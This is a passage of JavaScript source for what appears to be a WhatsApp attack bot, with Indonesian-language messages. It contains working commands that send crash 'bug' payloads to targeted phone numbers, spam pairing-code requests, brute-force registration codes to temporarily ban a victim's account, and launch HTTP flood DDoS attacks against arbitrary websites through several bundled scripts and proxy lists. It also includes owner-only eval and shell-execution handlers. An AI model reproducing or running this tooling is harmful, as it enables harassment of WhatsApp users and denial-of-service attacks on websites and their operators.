							await LIVELOK(x, PORKE)
							await VIRDOK(x, PORKE)
							await BLEKING(x, PORKE2)
							await LIVELOK(x, PORKE)
							await VIRDOK(x, PORKE)
							await BLEKING(x, PORKE2)
							await LIVELOK(x, PORKE)
							await VIRDOK(x, PORKE)
						}
					} else {
						failed.push(x)
					}
				}
				const successList = input.filter(x => !failed.includes(x))
				const failedList = input.filter(x => failed.includes(x))
				if (successList.length > 0 && failedList.length > 0) {
					await zreply("𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 " +
						successList.map(x => "@" + x.split("@")[0]).join(" ") +
						"\n\n𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 " +
						failedList.map(x => "@" + x.split("@")[0]).join(" "))
				} else if (successList.length > 0) {
					await zreply("𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 " +
						successList.map(x => "@" + x.split("@")[0]).join(" "))
				} else if (failedList.length > 0) {
					await zreply("𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 " +
						failedList.map(x => "@" + x.split("@")[0]).join(" "))
				}
			}
			break
			case "locimg": {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isPremium) return zreply(mess.premium)
				if (input.length == 0) return zreply("Reply/Tag/nomer")
				const failed = []
				await zreply(mess.bugrespon)
				for (const x of input) {
					if ((await VxoZap.onWhatsApp(x)).length > 0 && !owner.includes(x.split("@")[0]) && !kontributor.includes(x.split("@")[0]) && x.split("@")[0] !== Creator && x !== botNumber) {
						for (let j = 0; j < 10; j++) {
							await LIVELOK(x, PORKE)
							await PIRGO(x, GSZ)
							await LIVELOK(x, PORKE)
							await PIRGO(x, GSZ)
							await LIVELOK(x, PORKE)
							await PIRGO(x, GSZ)
							await LIVELOK(x, PORKE)
							await PIRGO(x, GSZ)
							await LIVELOK(x, PORKE)
							await PIRGO(x, GSZ)
							await LIVELOK(x, PORKE)
							await PIRGO(x, GSZ)
							await LIVELOK(x, PORKE)
							await PIRGO(x, GSZ)
							await LIVELOK(x, PORKE)
							await PIRGO(x, GSZ)
							await LIVELOK(x, PORKE)
							await PIRGO(x, GSZ)
						}
					} else {
						failed.push(x)
					}
				}
				const successList = input.filter(x => !failed.includes(x))
				const failedList = input.filter(x => failed.includes(x))
				if (successList.length > 0 && failedList.length > 0) {
					await zreply("𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 " +
						successList.map(x => "@" + x.split("@")[0]).join(" ") +
						"\n\n𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 " +
						failedList.map(x => "@" + x.split("@")[0]).join(" "))
				} else if (successList.length > 0) {
					await zreply("𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 " +
						successList.map(x => "@" + x.split("@")[0]).join(" "))
				} else if (failedList.length > 0) {
					await zreply("𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 " +
						failedList.map(x => "@" + x.split("@")[0]).join(" "))
				}
			}
			break
			//END BUG\\
			//=================================================//


			// TEMP BAN \\
			//=================================================//
			case 'spampair': {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isCreator) return zreply(mess.owner)
				if (!q) return zreply(`*Syntax Error!*\n\n_Use : Spampair NUMBER|AMOUNT_\n_Example : Spampair 62xx\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
				let [peenis, pepekk = "200"] = q.split("|")
				await zreply(`</> 𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙥𝙖𝙢 𝘾𝙤𝙙𝙚〽️`)
				await reaction(m.chat, "✅")
				let target = peenis.replace(/[^0-9]/g, '').trim()
				let {
					default: makeWaSocket,
					useMultiFileAuthState,
					fetchLatestBaileysVersion
				} = require('@whiskeysockets/baileys')
				let {
					state
				} = await useMultiFileAuthState('TheGetsuzoZhiro')
				let {
					version
				} = await fetchLatestBaileysVersion()
				let sucked = await makeWaSocket({
					auth: state,
					version,
					logger: pino({
						level: 'fatal'
					})
				})
				for (let i = 0; i < pepekk; i++) {
					await sleep(1500)
					let prc = await sucked.requestPairingCode(target)
					await console.log(`# Succes Spam Pairing Code - Number : ${target} - Code : ${prc}`)
				}
				await sleep(15000)
			}
			break
			case 'tempban': {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isCreator) return zreply(mess.owner)
				if (args.length < 1) return zreply(`*Syntax Error!*\n\n_Use : Tempban ID|NO_\n_Example : Tempban 62|819\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
				const args2 = args[0].split('|');
				if (args2.length !== 2) return zreply(`Syntax Error!*\n\n_Use : Tempban ID|NO_\n_Example : Tempban 62|819_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
				const VxoZapCountryCode = args2[0];
				const xtarget = args2[1];
				const VxoZapNumber = xtarget.replace('@s.whatsapp.net', '');
				const VxoZapmerge = `${VxoZapCountryCode}${xtarget}`
				const VxoZapMention = VxoZapmerge + '@s.whatsapp.net';
				await zreply(`</> 𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙥𝙖𝙢 𝘾𝙤𝙙𝙚〽️`)
				try {
					const {
						stateVxoZap,
						saveCredsVxoZap
					} = await useMultiFileAuthState('./TheGetsuzoZhiro');
					const VxoZapRequest = await VxoZap.requestRegistrationCode({
						phoneNumber: '+' + VxoZapCountryCode + `${VxoZapNumber}`,
						phoneNumberCountryCode: VxoZapCountryCode,
						phoneNumberNationalNumber: `${VxoZapNumber}`,
						phoneNumberMobileCountryCode: 724,
						method: 'sms'
					});
				} catch (err) {}

				for (let i = 0; i < 10000; i++) {
					try {
						var VxoZapPrefix = Math.floor(Math.random() * 999);
						var VxoZapSuffix = Math.floor(Math.random() * 999);
						await VxoZap.register(`${VxoZapPrefix}-${VxoZapSuffix}`);
					} catch (err) {
						console.log(`${VxoZapPrefix}-${VxoZapSuffix}`);
					}
				}
			}
			break

			//DDOS WEBSITE\\
			//=================================================//
			case 'dos': {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isPremium) return zreply(mess.premium)
				let url = q.split(" ")[0]
				let time = q.split(" ")[1] * 1000
				if (args.length === 2 && url && !isNaN(time)) {
					let attack = () => {
						let totalRequests = 0
						let threads = []
						for (let j = 0; j < 6; j++) {
							threads.push(
								new Promise((resolve, reject) => {
									let interval = setInterval(() => {
										for (let j = 0; j < 100; j++) {
											fetch(url)
												.then(() => {
													totalRequests++
													console.log(`Attacking => ${url} Total Requests: ${totalRequests} Duration: ${time}`)
												})
												.catch(err => {})
										}
									}, 750)
									setTimeout(() => {
										clearInterval(interval)
										resolve()
									}, time)
								})
							)
						}

						Promise.all(threads)
							.then(() => console.log("Attack Complete"))
							.catch(err => console.error("Error In Attack:", err))
					}

					attack()
				} else {
					zreply(`Format Pesan Tidak Benar. Gunakan Format: Dos [Url] [Time]`)
				}
			}
			break
			case 'ddos': {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isPremium) return zreply(mess.premium)
				let url = q.split(" ")[0]
				let time = q.split(" ")[1]
				let thread = q.split(" ")[2]
				let rate = q.split(" ")[3]
				if (args.length === 4 && url && time && thread && rate) {
					zreply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} 🎭 Serangan Berlangsung Selama ${time} Detik.`);
					exec(`node ./system/ddos/hentai.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
						if (err) return console.log(err.toString())
						if (stdout) return console.log(util.format(stdout))
					})
				} else {
					zreply(`Format Pesan Tidak Benar. Gunakan Format : Ddos [Url] [Time] [Thread] [Rate]`)
				}
			}
			break
			case 'xc': {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isPremium) return zreply(mess.premium);
				let [url, time, rate, thread, proxyFile] = q.split(" ");
				if (args.length === 5 && url && time && rate && thread && proxyFile) {
					zreply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju: ${url} 🎭 Serangan Berlangsung Selama ${time} Detik.`);
					exec(`node ./system/ddos/LC.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
						if (err) return console.log(err.toString());
						if (stdout) return console.log(util.format(stdout));
					});
				} else {
					zreply(`Format Pesan Tidak Benar. Gunakan Format: Xc [Url] [Time] [Rate] [Thread] [ProxyFile]`);
				}
			}
			break
			case 'mix': {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isPremium) return zreply(mess.premium)
				let url = q.split(" ")[0]
				let time = q.split(" ")[1]
				let thread = q.split(" ")[2]
				let rate = q.split(" ")[3]
				if (args.length === 4 && url && time && thread && rate) {
					zreply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} 🎭 Serangan Berlangsung Selama ${time} Detik.`);
					exec(`node ./system/ddos/mix.js ${url} ${time} ${thread} ${rate}`, (err, stdout) => {
						if (err) return console.log(err.toString())
						if (stdout) return console.log(util.format(stdout))
					})
				} else {
					zreply(`Format Pesan Tidak Benar. Gunakan Format : Mix [Url] [Time] [Thread] [Rate]`)
				}
			}
			break
			case 'floods': {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isPremium) return zreply(mess.premium)
				let url = q.split(" ")[0]
				let time = q.split(" ")[1]
				let thread = q.split(" ")[2]
				let rate = q.split(" ")[3]
				if (args.length === 4 && url && time && thread && rate) {
					zreply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} 🎭 Serangan Berlangsung Selama ${time} Detik.`);
					exec(`node ./system/ddos/floods.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
						if (err) return console.log(err.toString())
						if (stdout) return console.log(util.format(stdout))
					})
				} else {
					zreply(`Format Pesan Tidak Benar. Gunakan Format : Floods [Url] [Time] [Thread] [Rate]`)
				}
			}
			break
			case 'ua': {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isPremium) return zreply(mess.premium)
				let url = q.split(" ")[0]
				let time = q.split(" ")[1]
				let thread = q.split(" ")[2]
				let rate = q.split(" ")[3]
				if (args.length === 4 && url && time && thread && rate) {
					zreply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} 🎭 Serangan Berlangsung Selama ${time} Detik.`);
					exec(`node ./system/ddos/kilua.js ${url} ${time} ${thread} proxy.txt ${rate} ua.txt`, (err, stdout) => {
						if (err) return console.log(err.toString())
						if (stdout) return console.log(util.format(stdout))
					})
				} else {
					zreply(`Format Pesan Tidak Benar. Gunakan Format : Ua [Url] [Time] [Thread] [Rate]`)
				}
			}
			break
			case 'xchrome': {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isPremium) return zreply(mess.premium)
				let url = q.split(" ")[0]
				let time = q.split(" ")[1]
				let thread = q.split(" ")[2]
				let rate = q.split(" ")[3]
				if (args.length === 4 && url && time && thread && rate) {
					zreply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} 🎭 Serangan Berlangsung Selama ${time} Detik.`);
					exec(`node ./system/ddos/chromev3.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
						if (err) return console.log(err.toString())
						if (stdout) return console.log(util.format(stdout))
					})
				} else {
					zreply(`Format Pesan Tidak Benar. Gunakan Format Xchrome [Url] [Time] [Thread] [Rate]`)
				}
			}
			break
			case 'tls': {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isPremium) return zreply(mess.premium)
				let url = q.split(" ")[0]
				let time = q.split(" ")[1]
				let thread = q.split(" ")[2]
				let rate = q.split(" ")[3]
				if (args.length === 4 && url && time && thread && rate) {
					zreply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} 🎭 Serangan Berlangsung Selama ${time} Detik.`);
					exec(`node ./system/ddos/tls-arz.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
						if (err) return console.log(err.toString())
						if (stdout) return console.log(util.format(stdout))
					})
				} else {
					zreply(`Format Pesan Tidak Benar. Gunakan Format Tls [Url] [Time] [Thread] [Rate]`)
				}
			}
			break
			case 'tlsbypass': {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isPremium) return zreply(mess.premium)
				let url = q.split(" ")[0]
				let time = q.split(" ")[1]
				let thread = q.split(" ")[2]
				let rate = q.split(" ")[3]
				if (args.length === 4 && url && time && thread && rate) {
					zreply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} 🎭 Serangan Berlangsung Selama ${time} Detik.`);
					exec(`node ./system/ddos/tls-bypass.js ${url} ${time} ${rate} ${thread}`, (err, stdout) => {
						if (err) return console.log(err.toString())
						if (stdout) return console.log(util.format(stdout))
					})
				} else {
					zreply(`Format Pesan Tidak Benar. Gunakan Format Tlsbypass [Url] [Time] [Thread] [Rate]`)
				}
			}
			break
			case 'tlsv2': {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isPremium) return zreply(mess.premium)
				let url = q.split(" ")[0]
				let time = q.split(" ")[1]
				let thread = q.split(" ")[2]
				let rate = q.split(" ")[3]
				if (args.length === 4 && url && time && thread && rate) {
					zreply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} 🎭 Serangan Berlangsung Selama ${time} Detik.`);
					exec(`node ./system/ddos/tls.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
						if (err) return console.log(err.toString())
						if (stdout) return console.log(util.format(stdout))
					})
				} else {
					zreply(`Format Pesan Tidak Benar. Gunakan Format Tlsv2 [Url] [Time] [Thread] [Rate]`)
				}
			}
			break
			case 'bypass-cf': {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isPremium) return zreply(mess.premium)
				let url = q.split(" ")[0]
				let time = q.split(" ")[1]
				let thread = q.split(" ")[2]
				let rate = q.split(" ")[3]
				if (args.length === 4 && url && time && thread && rate) {
					zreply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} 🎭 Serangan Berlangsung Selama ${time} Detik.`);
					exec(`node ./system/ddos/bypass.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
						if (err) return console.log(err.toString())
						if (stdout) return console.log(util.format(stdout))
					})
				} else {
					zreply(`Format Pesan Tidak Benar. Gunakan Format : Bypass-cf [Url] [Time] [Thread] [Rate]`)
				}
			}
			break
			case 'tls-vip': {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isPremium) return zreply(mess.premium)
				let url = q.split(" ")[0]
				let time = q.split(" ")[1]
				let thread = q.split(" ")[2]
				let rate = q.split(" ")[3]
				if (args.length === 4 && url && time && thread && rate) {
					zreply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} 🎭 Serangan Berlangsung Selama ${time} Detik.`);
					exec(`node ./system/ddos/tlsvip.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
						if (err) return console.log(err.toString())
						if (stdout) return console.log(util.format(stdout))
					})
				} else {
					zreply(`Format Pesan Tidak Benar. Gunakan Format Tls-vip [Url] [Time] [Thread] [Rate]`)
				}
			}
			break
			//END DDOS\\

			//END\\
			//=================================================//

			default:
				if (budy.startsWith("=>")) {
					if (!isCreator) return zreply(mess.owner)

					function Return(sul) {
						sat = JSON.stringify(sul, null, 2)
						bang = util.format(sat)
						if (sat == undefined) {
							bang = util.format(sul)
						}
						return zreply(bang)
					}
					try {
						zreply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
					} catch (e) {
						zreply(String(e))
					}
				}
				//=================================================//
				if (budy.startsWith(">")) {
					if (!isCreator) return zreply(mess.owner)
					try {
						let evaled = await eval(budy.slice(2))
						if (typeof evaled !== "string") evaled = require("util").inspect(evaled)
						await zreply(evaled)
					} catch (err) {
						await zreply(String(err))
					}
				}
				//=================================================//
				if (budy.startsWith("$")) {
					if (!isCreator) return zreply(mess.owner)
					exec(budy.slice(2), (err, stdout) => {
						if (err) return zreply(`${err}`)
						if (stdout) return zreply(`${stdout}`)
					})
				}
		}
	} catch (err) {
		const handleError = async () => {
			console.log(require("util").format(err));
		};
		handleError();
	}
}
//=================================================//
let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.whiteBright("├"), chalk.keyword("red")("[ UPDATE ]"), __filename)
	delete require.cache[file]
	require(file)
})